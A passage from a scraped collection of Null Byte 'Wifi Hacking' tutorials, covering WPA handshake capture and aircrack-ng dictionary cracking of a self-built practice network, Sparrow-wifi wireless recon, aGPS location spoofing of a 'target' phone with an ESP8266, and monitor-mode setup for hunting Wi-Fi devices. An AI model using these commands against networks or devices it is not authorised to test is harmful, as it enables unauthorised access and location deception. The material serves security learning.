hamshake_injector.ino sketch, click the \"Upload\" button to compile and upload the code to the microcontroller. At the bottom of the window, you should see something similar to the following.\nSketch uses 266372 bytes (25%) of program storage space. Maximum is 1044464 bytes.Executable segment sizes:\nIROM   : 236768          - code in flash         (default or ICACHE_FLASH_ATTR)\nGlobal variables use 27684 bytes (33%) of dynamic memory, leaving 54236 bytes for local variables. Maximum is 81920 bytes.\nIRAM   : 26888   / 32768 - code in IRAM          (ICACHE_RAM_ATTR, ISRs...)\nDATA   : 1988  )         - initialized variables (global, static) in RAM/HEAP\nRODATA : 728   ) / 81920 - constants             (global, static) in RAM/HEAP\nBSS    : 24968 )         - zeroed variables      (global, static) in RAM/HEAP\nesptool.py v2.8\nSerial port /dev/cu.usbserial-110\nConnecting....\nChip is ESP8266EX\nFeatures: WiFi\nCrystal is 26MHz\nMAC: ██:██:██:██:██:██\nUploading stub...\nRunning stub...\nStub running...\nChanging baud rate to 460800\nConfiguring flash size...\nAuto-detected Flash size: 4MB\nCompressed 270528 bytes to 199394...\nWrote 270528 bytes (199394 compressed) at 0x00000000 in 5.2 seconds (effective 416.4 kbit/s)...\nHash of data verified.\nHard resetting via RTS pin...\nStep 7: Enter Monitor Mode\nOn your computer, put your wireless interface into monitor mode so that we can sniff the traffic over the network. You can use grep UP with ip a or ifconfig to find the name of your Wi-Fi adapter. Below, mine is wlp3s0.\n* Don't Miss: Check if Your Wireless Network Adapter Supports Monitor Mode & Packet Injection\n~$ ip a | grep UP\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n2: enp0s25: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000\n4: wlp3s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\nNow, take your wireless card's name and use the airmon-ng start command to put it into monitor mode.\n~$ sudo airmon-ng start wlp3s0\nPHY Interface   Driver      Chipset\nphy0    wlp3s0      iwlwifi     Intel Corporation Centrino Advanced-N 6205 [Taylor Peak] (rev 34)\n(mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)\n(mac80211 station mode vif disabled for [phy0]wlp3s0)\nYou can now check that the card has a \"mon\" at the end using the same command used above to find the card's name. You could also try it with iwconfig. Below, mine is now wlp3s0mon.\n~$ ip a | grep UP\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n2: enp0s25: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000\n17: wlp3s0mon: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000\nNow, start recording on a wireless interface with airodump-ng using -c 11 to set channel it to 11. Of course, if you used a different channel, make sure to use that instead.\n~$ sudo airodump-ng wlp3s0mon -c 1\nStep 8: Open Wireshark\nNow, unplug the ESP8266 board from your computer, and let's jump over to Wireshark. Here, we'll try to capture packets and make sure that we can successfully receive what we're looking for.\nSo, start Wireshark, and make sure you're currently connected to the correct Wi-Fi network. Start running it (click the shark fin icon), and then stop it shortly after to see that it's working. Now, we need to write a capture filter that will allow us to search for handshakes. Type the following into the filter field.\nwlan.ssid == \"test\" || eapol\nEapol will give us handshakes and omit any other packets that aren't relevant, so we should only see handshakes to capture if we're scanning with this filter.\nStart the scan again, then plug in the microcontroller to see if we're broadcasting handshakes.\nYou should now be seeing lots and lots of different handshakes. Stop the scan because this should be everything we need. Click on one of the handshakes to see more information about it. Then, you can scroll through the handshakes to see all the different keys.\nWith all of these, we should have everything needed to crack the password.\nStep 9: Save Your Scan\nNow, how do we actually go about cracking the password? First, let's save what we found. In Wireshark, go to \"File,\" then \"Export Specific Packet.\" I'm saving it to my desktop (name it whatever you want), but make sure you change the \"Export as\" type to \"pcap\" format. Save it.\nStep 10: Run the Attack\nOK, now open a terminal window and run aircrack-ng with a dictionary and the PCAP file. This will locate any handshakes inside the file that are valid to crack. At first, I'm going to omit the wordlist because it will auto-run. This would be the list we would use if we wanted to actually attempt some cracking, but I just want to confirm there is a captured handshake.\n~$ sudo aircrack-ng /myhandshakes.pcap\nOpening myhandshakes.pcap\nRead 413 packets.\n#  BSSID                 ESSID          Encryption\n1  ██:██:██:██:██:██                    WPA (0 handshake)\n2  ██:██:██:██:██:██                    WPA (1 handshake)\nIndex number of target network?\nAs you can see above, there is one with a valid handshake. Now, let's see if we can run the attack.\n~$ sudo aircrack-ng -w /wordlist.txt /myhandshakes.pcap\nOpening myhandshakes.pcap\nRead 413 packets.\n#  BSSID                 ESSID          Encryption\n1  ██:██:██:██:██:██                    WPA (0 handshake)\n2  ██:██:██:██:██:██                    WPA (1 handshake)\nIndex number of target network? 2\nOpening myhandshakes.pcap\nRead 413 packets.\n1 potential targets\nAn ESSID is required. Try option -e.\nQuitting airrack-ng...\nIf you get an error like the one above, you didn't capture any beacon frames with the network name in them, which is necessary to crack it.\nIn this case, I actually wrote a bad filter above, where I was only including eapol packets when I exported everything from Wireshark. To fix this, go back to Wireshark. The beacon frames contain the name of the network under the tag parameters, so change the capture filter to have the transmitter address of the fake network, then re-export the file to your desktop.\neapol || wlan.fc.type_subtype == 0x0008\nNow, run the attack again with the newly created PCAP file.\n~$ sudo aircrack-ng -w /wordlist.txt /myhandshakesUPDATED.pcap\nAircrack-ng 1.2 rc4\n[00:00:01] 3956/4002 keys tested (2209.00 k/s)\nTime left: 0 seconds                                      98.85%\nKEY FOUND! [ nullbytewht ]\nMaster Key     : 47 69 21 B2 4E CF 10 C4 CC AE 08 85 17 96 05 DD\n88 89 48 A3 F8 04 A8 8E D1 6B 81 23 FD 90 DC BB\nTransient Key  : AC 07 60 0B A3 82 44 95 97 2C E0 88 44 29 04 20\nB2 68 33 99 73 17 C6 31 41 24 58 F8 F6 F9 85 63\n01 F9 E7 B7 E8 D2 6B EE 1A 02 71 56 5C D6 38 41\nD0 DA 26 38 63 ED 70 71 ED F9 B8 3A 1B 7E 94 B5\nEAPOL HMAC     : BB 77 1B 4D 6F FD FE 44 C1 94 8A A1 3E 31 2A 0B\nWhen we run it now, we can see we were able to successfully crack the network because we actually had the beacon frame necessary. Now, if we go back and omit the wordlist again, we should be able to see that we were successfully able to identify not only the handshake but also the name of the network.\n~$ sudo aircrack-ng /myhandshakesUPDATED.pcap\nOpening myhandshakesUPDATED.pcap\nRead 7851 packets.\n#  BSSID                 ESSID          Encryption\n1  ██:██:██:██:██:██     TheName        WPA (1 handshake)\nChoosing first network as target.\nOpening myhandshakesUPDATED.pcap\nRead 7851 packets.\n1 potential targets\nPlease specify a dictionary (option -w).\nAs you can see above, I have a single valid handshake for the network called \"TheName,\" which we were able to generate by flashing the ESP8266 in Arduino IDE.\nHappy Cracking!\nWe already know the ESP8266 microcontroller is a pretty incredible device. With it, we can play both sides of a Wi-Fi conversation and make it so we can practice Wi-Fi handshake cracking on a single microcontroller that costs just a few dollars.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Retia/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Conduct Wireless Recon on Bluetooth, Wi-Fi & GPS with Sparrow-wifi",
        "link": "https://null-byte.wonderhowto.com/how-to/conduct-wireless-recon-bluetooth-wi-fi-gps-with-sparrow-wifi-0216351/",
        "content": "* WonderHowTo\nIf you're ever in a situation where you need to take a peek at the wireless spectrum, whether it's for Bluetooth or Wi-Fi devices, there's a fascinating Python 3-based tool called Sparrow-wifi you should check out. It's cross-platform, easy to use, and has an impressive GUI that shows you the signal strength of nearby devices.\nSparrow-wifi, branded as a \"next-generation\" analysis tool for wireless reconnaissance and surveillance, is simple to install. There's just a bunch of Python libraries you need, and then no matter what system you're on, it should be pretty easy to use. It works great on a Raspberry Pi, and just as good on Kali Linux.\nWhat You Could Do with Sparrow-Wifi\nGhostop14 created Sparrow-wifi to be installed on a Raspberry Pi attached to a drone or rover for war-flying or wardriving use cases. It was even tested out on a 3DR Solo aerial drone, and you can read more about their experience using Sparrow-wifi on Raspberry Pi and drone on the GitHub page. We'll just be using it on a Kali Linux system running on a laptop, but it'll be similar for a Pi-based project.\nBefore getting into using Sparrow-wifi, it's good to show what all it can do. Being a \"next-generation 2.4 GHz and 5 GHz Wifi spectral awareness tool,\" it has Wi-Fi capabilities, a software-defined radio, advanced Bluetooth options, and GPS capabilities (which can also be connected to the GPS on drones and rovers). The most prominent features worth pointing out today include but aren't limited to:\n* Overlay 2.4 GHz and 5 GHz spectrums in real-time on top of the Wi-Fi spectrum.\n* Identify SSID information for nearby devices over Wi-Fi.\n* Identify nearby Bluetooth and Bluetooth LE devices.\n* Track Bluetooth LE advertisement sources (iBeacons) with a telemetry window.\n* Send out your own iBeacon advertisements.\n* War-fly or wardrive using a Raspberry Pi on a drone or rover using GUI-controlled or autonomous scan and record modes.\n* Import or export from or to a CSV file or JSON file.\n* See Google Maps locations from GPS coordinates provided by discovered SSID or Bluetooth devices, which can be helpful to plot the Wi-Fi telemetry over time.\nWhat You Need to Get Started\nYou'll need a wireless network adapter that can be put into monitor mode. Aside from that, you'll need a computer to run it on that has Python 3, and that's it.\nRecommended Wireless Adapter: Alfa AWUS036NEH Network Adapter\nStep 1: Update & Upgrade Kali\nBefore installing anything, it's good to use update to resync and update package index files on the system from their sources, as well as upgrade to update all of the tools that have newer versions found in the update. The upgrade might take a while, depending on how many packages are out of date.\n~$ sudo apt update && sudo apt upgrade\nHit:1 http://kali.download/kali kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\n17 packages can be upgraded. Run 'apt list --upgradable' to see them.\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nCalculating upgrade... Done\nThe following packages were automatically installed and are no longer required:\nfonts-glyphicons-halflings gir1.2-appindicator3-0.1 libappindicator3-1\nlibboost-iostreams1.67.0 libboost-system1.67.0 libboost-thread1.67.0\nlibgdal26 libicu63 libmpdec2 libprotobuf22 libpython3.7-minimal\nlibpython3.7-stdlib libqhull7 libre2-6 libx264-155 libx265-179\nphp7.3-mysql python3-flask-session python3-pcapfile python3.7\npython3.7-minimal ruby-did-you-mean\nUse 'sudo apt autoremove' to remove them.\nThe following packages have been kept back:\ncrackmapexec gcc-10-base lib32gcc-s1 lib32stdc++6 libatomic1 libcc1-0\nlibgcc-s1 libgfortran5 libgomp1 libitm1 liblsan0 libobjc4 libquadmath0\nlibstdc++6 libtsan0 libubsan1 php-common\n0 upgraded, 0 newly installed, 0 to remove and 17 not upgraded.\nStep 2: Install the Needed Dependencies\nNow, we need to install some of the Python 3 and GPS tools needed, including python3-pip, gpsd, gpsd-clients, python3-tk, and python3-setuptools. Use the following command to do so.\n~$ sudo apt install python3-pip gpsd gpsd-clients python3-tk python3-setuptools\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\npython3-setuptools is already the newest version (46.1.3-1).\npython3-setuptools set to manually installed.\nThe following additional packages will be installed:\ngpsd-tools libgps26 python-pip-whl python3-gps python3-wheel\nSuggested packages:\ntix python3-tk-dbg\nThe following NEW packages will be installed:\ngpsd gpsd-clients gpsd-tools libgps26 python-pip-whl python3-gps\npython3-pip python3-wheel\nThe following packages will be upgraded:\n1 upgraded, 8 newly installed, 0 to remove and 824 not upgraded.\nNeed to get 3,533 kB of archives.\nAfter this operation, 7,755 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 http://kali.download/kali kali-rolling/main amd64 libgps26 amd64 3.20-12 [98.6 kB]\nGet:2 http://kali.download/kali kali-rolling/main amd64 gpsd amd64 3.20-12 [413 kB]\nGet:3 http://kali.download/kali kali-rolling/main amd64 gpsd-tools amd64 3.20-12 [299 kB]\nGet:4 http://kali.download/kali kali-rolling/main amd64 python3-gps amd64 3.20-12 [105 kB]\nGet:5 http://kali.download/kali kali-rolling/main amd64 gpsd-clients amd64 3.20-12 [432 kB]\nGet:6 http://kali.download/kali kali-rolling/main amd64 python-pip-whl all 20.0.2-5kali1 [1,842 kB]\nGet:7 http://kali.download/kali kali-rolling/main amd64 python3-wheel all 0.34.2-1 [24.0 kB]\nGet:8 http://kali.download/kali kali-rolling/main amd64 python3-pip all 20.0.2-5kali1 [211 kB]\nGet:9 http://kali.download/kali kali-rolling/main amd64 python3-tk amd64 3.8.5-1 [109 kB]\nFetched 3,533 kB in 1s (2,563 kB/s)\nReading changelogs... Done\nSelecting previously unselected package libgps26:amd64.\n(Reading database ... 287092 files and directories currently installed.)\nPreparing to unpack .../0-libgps26_3.20-12_amd64.deb ...\nUnpacking libgps26:amd64 (3.20-12) ...\nSelecting previously unselected package gpsd.\nPreparing to unpack .../1-gpsd_3.20-12_amd64.deb ...\nUnpacking gpsd (3.20-12) ...\nSelecting previously unselected package gpsd-tools.\nPreparing to unpack .../2-gpsd-tools_3.20-12_amd64.deb ...\nUnpacking gpsd-tools (3.20-12) ...\nSelecting previously unselected package python3-gps.\nPreparing to unpack .../3-python3-gps_3.20-12_amd64.deb ...\nUnpacking python3-gps (3.20-12) ...\nSelecting previously unselected package gpsd-clients.\nPreparing to unpack .../4-gpsd-clients_3.20-12_amd64.deb ...\nUnpacking gpsd-clients (3.20-12) ...\nSelecting previously unselected package python-pip-whl.\nPreparing to unpack .../5-python-pip-whl_20.0.2-5kali1_all.deb ...\nUnpacking python-pip-whl (20.0.2-5kali1) ...\nSelecting previously unselected package python3-wheel.\nPreparing to unpack .../6-python3-wheel_0.34.2-1_all.deb ...\nUnpacking python3-wheel (0.34.2-1) ...\nSelecting previously unselected package python3-pip.\nPreparing to unpack .../7-python3-pip_20.0.2-5kali1_all.deb ...\nUnpacking python3-pip (20.0.2-5kali1) ...\nPreparing to unpack .../8-python3-tk_3.8.5-1_amd64.deb ...\nUnpacking python3-tk:amd64 (3.8.5-1) over (3.8.2-2) ...\ndpkg: warning: unable to delete old directory '/usr/lib/python3.7/tkinter': Directory not empty\nSetting up libgps26:amd64 (3.20-12) ...\nSetting up gpsd-tools (3.20-12) ...\nSetting up python3-tk:amd64 (3.8.5-1) ...\nSetting up python3-wheel (0.34.2-1) ...\nSetting up python-pip-whl (20.0.2-5kali1) ...\nSetting up python3-gps (3.20-12) ...\nSetting up gpsd (3.20-12) ...\nCreating/updating gpsd user account...\ngpsd.socket is a disabled or a static unit, not starting it.\ngpsd.service is a disabled or a static unit, not starting it.\ngpsd.socket is a disabled or a static unit, not starting it.\nSetting up gpsd-clients (3.20-12) ...\nSetting up python3-pip (20.0.2-5kali1) ...\nProcessing triggers for desktop-file-utils (0.24-1) ...\nProcessing triggers for mime-support (3.64) ...\nProcessing triggers for libc-bin (2.30-4) ...\nProcessing triggers for man-db (2.9.1-1) ...\nProcessing triggers for kali-menu (2020.2.2) ...\nBefore installing the next batch of tools that are needed, you should upgrade pip3 first to prevent errors that others have experienced when installing the other dependencies. Use the following command to do it.\n~$ sudo pip3 install --upgrade pip\nCollecting pip\nDownloading pip-20.2.2-py2.py3-none-any.whl (1.5 MB)\n|████████████████████████████████| 1.5 MB 1.0 MB/s\nInstalling collected packages: pip\nAttempting uninstall: pip\nFound existing installation: pip 20.0.2\nNot uninstalling pip at /usr/lib/python3/dist-packages, outside environment /usr\nCan't uninstall 'pip'. No files were found to uninstall.\nSuccessfully installed pip-20.2.2\nFinally, install the last batch of dependencies needed for Sparrow-wifi, which include QScintilla, PyQtChart, gps3, dronekit, manuf, python-dateutil, numpy, and matplotlib.\n~$ sudo pip3 install QScintilla PyQtChart gps3 dronekit manuf python-dateutil numpy matplotlib\nCollecting QScintilla\nDownloading QScintilla-2.11.5-cp35.cp36.cp37.cp38-abi3-manylinux2014_x86_64.whl (2.6 MB)\n|████████████████████████████████| 2.6 MB 1.0 MB/s\nCollecting PyQtChart\nDownloading PyQtChart-5.15.0-5.15.0-cp35.cp36.cp37.cp38-abi3-manylinux2014_x86_64.whl (1.2 MB)\n|████████████████████████████████| 1.2 MB 7.2 MB/s\nCollecting gps3\nDownloading gps3-0.33.3-py2.py3-none-any.whl (29 kB)\nCollecting dronekit\nDownloading dronekit-2.9.2-py3-none-any.whl (56 kB)\n|████████████████████████████████| 56 kB 5.9 MB/s\nCollecting manuf\nDownloading manuf-1.1.1-py3-none-any.whl (539 kB)\n|████████████████████████████████| 539 kB 10.4 MB/s\nRequirement already satisfied: python-dateutil in /usr/lib/python3/dist-packages (2.8.1)\nRequirement already satisfied: numpy in /usr/lib/python3/dist-packages (1.17.4)\nRequirement already satisfied: matplotlib in /usr/lib/python3/dist-packages (3.2.1)\nRequirement already satisfied: PyQt5>=5.10.1 in /usr/lib/python3/dist-packages (from QScintilla) (5.14.2)\nCollecting PyQt5-sip<13,>=12.8\nDownloading PyQt5_sip-12.8.0-cp38-cp38-manylinux1_x86_64.whl (293 kB)\n|████████████████████████████████| 293 kB 11.2 MB/s\nCollecting pymavlink>=2.2.20\nDownloading pymavlink-2.4.9.tar.gz (3.6 MB)\n|████████████████████████████████| 3.6 MB 8.2 MB/s\nCollecting monotonic>=1.3\nDownloading monotonic-1.5-py2.py3-none-any.whl (5.3 kB)\nRequirement already satisfied: future in /usr/lib/python3/dist-packages (from pymavlink>=2.2.20->dronekit) (0.18.2)\nRequirement already satisfied: lxml in /usr/lib/python3/dist-packages (from pymavlink>=2.2.20->dronekit) (4.5.0)\nBuilding wheels for collected packages: pymavlink\nBuilding wheel for pymavlink (setup.py) ... done\nCreated wheel for pymavlink: filename=pymavlink-2.4.9-cp38-cp38-linux_x86_64.whl size=3695087 sha256=91c89fc1e95245a57d461a2cb23fcbd10c7319249cf782eb575c17fbe1e3ffa0\nStored in directory: /root/.cache/pip/wheels/3b/26/1c/5500a65a7d7ac54cade1db721eefce7b5c6e451862a21423bb\nSuccessfully built pymavlink\nInstalling collected packages: PyQt5-sip, QScintilla, PyQtChart, gps3, pymavlink, monotonic, dronekit, manuf\nSuccessfully installed PyQt5-sip-12.8.0 PyQtChart-5.15.0 QScintilla-2.11.5 dronekit-2.9.2 gps3-0.33.3 manuf-1.1.1 monotonic-1.5 pymavlink-2.4.9\nPyQtChart gps3 dronekit manuf python-dateutil numpy matplotlib\nStep 3: Install Sparrow-wifi\nNow, we're ready to install Sparrow-wifi, which you can clone from its GitHub repository. It's that easy, and we can start diving into what it has to offer and how to use it for wireless recon.\n~$ git clone https://github.com/ghostop14/sparrow-wifi\nCloning into 'sparrow-wifi'...\nremote: Enumerating objects: 75, done.\nremote: Counting objects: 100% (75/75), done.\nremote: Compressing objects: 100% (53/53), done.\nremote: Total 593 (delta 42), reused 53 (delta 22), pack-reused 518\nReceiving objects: 100% (593/593), 2.13 MiB | 3.14 MiB/s, done.\nResolving deltas: 100% (397/397), done.\nStep 4: Run Sparrow-wifi\nWith Sparrow-wifi installed, let's change into its directory:\n~$ cd sparrow-wifi\n~/sparrow-wifi$\nAnd see what's inside:\n~/sparrow-wifi$ ls\ndocs                        sparrowhackrf.py\nimages                      sparrowmap.py\n__init__.py                 sparrowrpi.py\nLICENSE                     sparrow-screenshot.png\nREADME.md                   sparrowtablewidgets.py\nrpi.setup_prerequisites.sh  sparrowwifiagent.cfg.sample\nscripts                     sparrowwifiagent.py\nsparrowbluetooth.py         sparrow-wifi.py\nsparrowcommon.py            spectrum-screenshot.png\nsparrowdialogs.py           telemetry.py\nsparrowdrone.py             telemetry-screenshot.png\nsparrow-elastic.py          wifi_icon.png\nsparrowgps.py               wirelessengine.py\nToday, we just want to use the main sparrow-wifi.py script; run that using:\n~/sparrow-wifi$ sudo ./sparrow-wifi.py\nWARNING: CPU random generator seem to be failing, disable hardware random number generation\nWARNING: RDRND generated: 0xffffffff 0xffffffff 0xffffffff 0xffffffff\nQStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'\nStep 5: Use Sparrow-wifi for Recon\nThat last command should open the GUI for Sparrow-wifi. Once it's up, we can select an interface that we want to scan on in the Local Interface drop-down menu. Then, press the \"Scan\" button next to it.\nIt will immediately start scanning for nearby devices, showing their SSIDs, MAC addresses, vendor names, security protocols, channels, frequencies, signal strengths, bandwidths, and more. It'll even show when the devices were first and last seen.\nWhile I don't have GPS activated, you can click the GPS icon in the top right of the window to open XGPS, which will show you the satellites being used to derive the GPS lock, as well as other useful data.\nLet's go over the menus real quick. In the \"Agent\" menu, you'll be able to connect to a remote agent, enable remote recordings, and perform agent discovery and configuration. We're not interested in any of this right now.\nNext up, we have \"Geo,\" which will show us some tools for GPS. For instance, there's GPS coordinate monitoring, which will tell us the last valid coordinates. We can also launch XGPS from here, just like before, when clicking the GPS icon. We've also got a way to create an access point map, which you can attempt to use to see where everything relates to you. There's also an option to create an SSID map from telemetry, which is more about the signal strength and other data.\nNow for the \"Bluetooth\" menu. If you have Bluetooth enabled, you can create an iBeacon or scan for existing ones, provided that a Bluetooth device is advertising. That's not always the case since Bluetooth devices are dissimilar to Wi-Fi in terms of the way they advertise themselves and how you can discover them. For instance, they hop frequencies, so they'll never look Wi-Fi the 2.4 GHz graph, which makes them hard to track. Unfortunately, you also cannot scan for both Bluetooth and Bluetooth LE devices at the same time.\nIn the \"Spectrum\" menu item, you can adjust the spectrum analyzer gain, but we're not interested in that for our purposes today.\nNext to the \"Scan\"/\"Stop scanning\" button, you can choose a different Scan Mode from the drop-down. We were on \"Normal,\" but if we switch it to \"Hunt,\" select a channel that we want to narrow it down to, then rescan to hunt a particular network.\nThere's also an option available to remove any network that hasn't been seen in the last three minutes, which is excellent to get rid of all the junk you don't want after starting a hunt scan.\nNow, in the left-bottom 2.4 GHz pane, we can see which spectrums are being utilized and where they are. So that if we wanted to focus on a particular thing, we could click on one of the results.\nOnce a result is highlighted, you can go up to the \"Telemetry\" menu, and choose \"Telemetry For Selected Network.\"\nThat'll open a new window with a tracker active. We can see the signal strength relative to this device, and if you have GPS enabled, you would be able to see the signal strength compared to the longitude and latitude changes as you move around. You could also point a directional antenna around to use the telemetry tracker to close in on the device.\nI'm not actually moving, so you're not going to see a big jump in signal strength in my screenshots, but if you move your directional antenna around and point it in the right direction, you'll see a big spike in strength in the top left pane. You can see spikes like that in our guides on choosing the right antenna for Wi-Fi hacking and hunting down Wi-Fi devices with a directional antenna. But setting up Wireshark is a lot more complicated than just firing up Sparrow-wifi.\n* Don't Miss: How to Pick an Antenna for Wi-Fi Hacking\nSparrow-wifi Is Definitely Worth a Look\nSparrow wifi is a quick and easy way to throw up a GUI interface and see what's around you, whether you're looking for Bluetooth or Wi-Fi devices. Now, it's not exactly as advanced as something like Kismet, which can show you all sorts of detailed information about everything, but it's a really great Python tool to get started. It can even be mounted on a drone, which is pretty impressive.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Retia/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Change a Phone's Coordinates by Spoofing Wi-Fi Geolocation Hotspots",
        "link": "https://null-byte.wonderhowto.com/how-to/change-phones-coordinates-by-spoofing-wi-fi-geolocation-hotspots-0203632/",
        "content": "* Antenna w/Cable (if not included with the board): Buy on Amazon\nImage by Kody/Null Byte\nYou'll also need an internet-connected computer with Arduino IDE installed. We'll use it to program the microcontroller, and the Micro-USB data cable is used to connect the ESP8266 to the computer for power and programming.\nStep 1: Add the ESP8266 Board to Arduino\nWe will use the free and cross-platform Arduino IDE, which will allow us to prototype what we need quickly. Arduino IDE (the IDE stands for \"integrated development environment\") will enable you to write and upload scripts to Arduino-like microcontroller devices easily.\nYou can download the Arduino IDE from the official website. Once it's installed, you'll need to click on the \"Arduino\" drop-down menu, then select \"Preferences.\" Next, paste the following URL into the Additional Boards Manager URLs field.\nhttp://arduino.esp8266.com/stable/package_esp8266com_index.json\nOnce that's complete, click \"OK\" to close the menu.\nNext, you'll need to add the NodeMCU to the Boards Manager. Click on \"Tools,\" then hover over the \"Board\" section to see the drop-down list. At the top, click \"Boards Manager\" to open the window that will allow us to add more boards.\nWhen the Boards Manager window opens, type \"esp8266\" into the search field. Select \"esp8266\" by \"ESP8266 Community\" and install it.\nYou should be ready to program your ESP8266-based microcontroller now. Plug your ESP8266 into your computer. When you click on \"Tools,\" you should see the correct port auto-selected.\nSelect the \"NodeMCU 1.0,\" or whichever ESP8266 you are using, from the \"Board\" menu. If you're using a bad USB cable, the port may not show up, so if you don't see anything after you've completed the other steps, try another cable first.\nThere are two main buttons up top. The checkmark compiles and checks our code for mistakes, and the right arrow pushes the code to the NodeMCU.\nStep 2: Download SkyLift\nNow that we have Arduino IDE set up, we'll need to download the SkyLift demo. We can clone its GitHub repository by typing the following into a new terminal window.\n~$ git clone https://github.com/adamhrv/skylift.git\nOnce it has completed, we can change directories into the folder that was downloaded and open the sketch in Arduino IDE.\n~$ cd skylift\n~$ cd skylift_demo/\n~$ open skylift_demo.ino\nHere, you'll see configuration files as well as the main script.\nFor our demo, we won't be modifying it. We can plug in our ESP8266 and, provided we see the LED on it flash, move on to the next step.\nStep 3: Push the Code to the ESP8266\nNow, it's time to push our code to the ESP8266, which should be plugged in via a Micro-USB cable to our computer running Arduino IDE.\nMake sure that the correct board is selected in Arduino and that the port is set to the right interface for the ESP8266. Once you're sure the settings are correct, you can click the arrow icon to upload the code to your ESP8266-based board. It shouldn't take long, and when it's complete, you should see several open networks being broadcast nearby.\nIn our example, the open networks are the signals we are spoofing, as they are known networks that have been geolocated to Facebook's headquarters. If we can put a smart device in a position where it has only those signals to determine it's likely location, we can trick it into believing it's near the networks at Facebook's HQ instead of its actual location.\nStep 4: Test the Demo in a Suitable Location\nOnce you've pushed the code to the ESP8266, it's time to test it out in a good location. You can use Wigle WiFi on Android to measure the number of nearby networks and hunt for places with poor reception of other networks. Once you find a location with lousy GPS reception, turn off the geolocation services on your phone, and then turn them back on again.\nWhen your phone attempts to locate itself, it will have only the spoofed signals from the ESP8266 to rely on. Because these aren't reliable, it should determine its location as Facebook HQ.\nThe location should be encoded into photos taken with geolocation enabled, suggested by apps the target is using, and it will persist until you stop broadcasting spoofed networks or the target gets a good signal from a GPS satellite or a legitimate nearby network with a known location.\nA-GPS Is Easy to Spoof in the Right Areas\nSmart devices have many ways of determining their location, and hackers can use them to create a situation where a device will rely on false information. It has been used for everything from art projects in which devices are spoofed, to the pools of the rich and famous, to situations where manipulating directions could give hackers an advantage. While it may not be an issue in every environment, be extra wary of GPS locations that are derived deep inside buildings or other areas that force devices to rely on easily spoofed signals.\nI hope you enjoyed this guide on spoofing aGPS locations using an ESP8266 microcontroller! If you have any questions about this tutorial on spoofing aGPS with Arduino, please ask below. And if you have a comment or idea for a future episode, feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Hunt Down Wi-Fi Devices with a Directional Antenna",
        "link": "https://null-byte.wonderhowto.com/how-to/hunt-down-wi-fi-devices-with-directional-antenna-0202696/",
        "content": "* Buy on Amazon: SimpleWiFi G2424 WiFi Extender Directional Parabolic Grid\nStep 1: Put Your Card into Monitor Mode\nTo get started, plug in your wireless network adapter to your Kali or Debian-based system, then identify its name by running the command ifconfig in a fresh terminal window. You should see your card named something like \"wlan1,\" but if it doesn't automatically appear, run ip a to see if it's attached but not yet up.\nIf you see your card with ip a but not ifconfig, run ifconfig wlan1 up to bring your card up. Now, it should be visible while running ifconfig.\nNow, to put your card into monitor mode, run the following command, assuming your wireless network adapter name is \"wlan1\" and it's up.\n~# airmon-ng start wlan1\nFound 3 processes that could cause trouble.\nKill them using 'airmon-ng check kill' before putting\nthe card in monitor mode, they will interfere by changing channels\nand sometimes putting the interface back in managed mode\n538 NetworkManager\n608 wpa_supplicant\n2446 dhclient\nPHY Interface   Driver      Chipset\nphy0    wlan0       ath9k       Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)\nphy4    wlan1       rt2800usb   Ralink Technology, Corp. RT5372\n(mac80211 monitor mode vif enabled for [phy4]wlan1 on [phy4]wlan1mon)\n(mac80211 station mode vif disabled for [phy4]wlan1)\nNow, your card should be named \"wlan1mon\" after being placed in monitor mode. With the wireless network adapter in monitor mode, we can start listening in on Wi-Fi traffic by running the following command.\n~# airodump-ng wlan1mon\nStep 2: Identify the Target & Broadcasting Channel\nWith the wireless network adapter in monitor mode, we can start listening in on Wi-Fi traffic by running the following command.\n~# airodump-ng wlan1mon\nWe should then see a list of nearby Wi-Fi networks we can target.\nCH 10 ][ Elapsed: 0 s ][ 2019-08-04 03:33\nBSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\nCC:40:D0:6C:73:D1  -40        2        0    0   8  195  WPA2 CCMP   PSK  SuicideGirls\nC0:8A:DE:B9:CD:D8  -50        2        0    0   1  130  OPN              SpectrumWiFi\nC0:8A:DE:79:CD:D8  -50        2        0    0   1  130  WPA2 CCMP   MGT  SpectrumWiFi Plus\nC0:8A:DE:39:CD:D8  -49        2        0    0   1  130  OPN              CableWiFi\n00:9C:02:D2:5E:B9  -65        2        0    0   1  54e. WPA2 CCMP   PSK  HP-Print-B9-Officejet Pro 8600\n88:96:4E:50:FF:40  -45        3        0    0   1  195  WPA2 CCMP   PSK  ATTMfRfcmS\n78:96:84:00:B5:B0  -48        2        0    0   1  130  WPA2 CCMP   PSK  The Daily Planet\nBSSID              STATION            PWR   Rate    Lost    Frames  Probe\nC0:8A:DE:79:CD:D8  